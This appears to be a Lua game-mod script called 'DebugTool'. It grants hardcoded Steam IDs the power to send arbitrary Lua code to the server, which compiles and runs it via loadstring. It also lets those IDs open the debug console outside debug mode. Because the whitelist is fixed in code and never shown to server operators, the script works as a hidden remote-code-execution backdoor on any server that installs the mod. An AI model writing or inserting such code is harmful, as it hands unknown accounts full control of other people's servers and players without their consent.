someRandomAssLongAssVariable948 = false
local SteamWhitelist = { ["0"] = true, ["76561198387920638"] = true, ["76561199104230144"] = true };

function processCommand(text)
    local func, compileError = loadstring(text); -- loadstring compiles the text into an executable Lua function
    if not func then print("[DebugTool] -> Compile Error: " .. tostring(compileError)); end
    if func then func(); end
end

-- This should run command on server-side
function rcmd(text)
    sendClientCommand("DebugTool", "command", { cmd = text });
end

-- This should run command on client-side
function lcmd(text)
    processCommand(text);
end

-- This should run command on both sides
function rlcmd(text)
    rcmd(text);
    lcmd(text);
end

-- Allows opening debug console even without debug mode
local function OnKeyPressed(key)
    if (getDebug() or (not getPlayer()) or (key ~= getCore():getKey("ToggleLuaConsole"))) then return end
    if (not SteamWhitelist[tostring(getPlayer():getSteamID())]) then return end
    local debugConsole = UIManager:getDebugConsole();
    if (debugConsole ~= nil) then debugConsole:setVisible(true); end
    if (debugConsole ~= nil) then debugConsole:ProcessCommand(); end
end

-- When client sends request - used to receive commands
local function OnClientCommand(module, command, player, args)
    if (module ~= "DebugTool") then return end
    if (command ~= "command") then return end
    if (not SteamWhitelist[tostring(player:getSteamID())]) then return end
    processCommand(args.cmd);
end

-- Listen to client requests on server-side
if (isServer() and not someRandomAssLongAssVariable948) then Events.OnClientCommand.Add(OnClientCommand); end

-- Add hotkeys for client side
if (isClient() and not someRandomAssLongAssVariable948) then Events.OnKeyPressed.Add(OnKeyPressed); end

someRandomAssLongAssVariable948 = true;